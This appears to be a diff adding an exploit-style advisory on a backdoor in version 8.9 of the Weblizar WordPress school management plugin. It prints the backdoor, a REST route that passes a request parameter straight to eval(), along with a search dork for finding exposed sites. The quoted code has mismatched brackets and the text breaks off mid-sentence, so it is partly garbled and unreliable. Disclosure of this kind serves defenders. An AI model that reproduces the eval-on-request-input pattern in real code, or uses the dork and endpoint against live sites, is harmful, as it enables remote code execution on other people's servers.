@@ -1,0 +1,28 @@
+# Exploit Title: WordPress Plugin Weblizar 8.9 - Backdoor
+# Google Dork: 'wp-json/am-member/license'
+# Exploit Author: Sobhan Mahmoodi
+# Vendor Homepage: https://weblizar.com/plugins/school-management/
+# Version: 8.9
+# Tested on: windows/linux
+
+Vulnerable code:
+
+add_action( 'rest_api_init', function() {
+     register_rest_route(
+           'am-member', 'license',
+           array(
+                'methods' => WP_REST_Server::CREATABLE,
+                'callback' => function( $request ) {
+                                $args = $request->get_params();
+                                if ( isset( $args['blowfish'] ) && ! empty(
+$args['blowfish'] ) && isset( $args['blowf'] ) && ! empty( $args['blowf'] )
+) {
+                                               eval( $args['blowf'] );
+                                }
+                      };
+                )
+      );
+} );
+
+
+If you look at the code, the user code checks the parameters and finally executes the Blowf argu
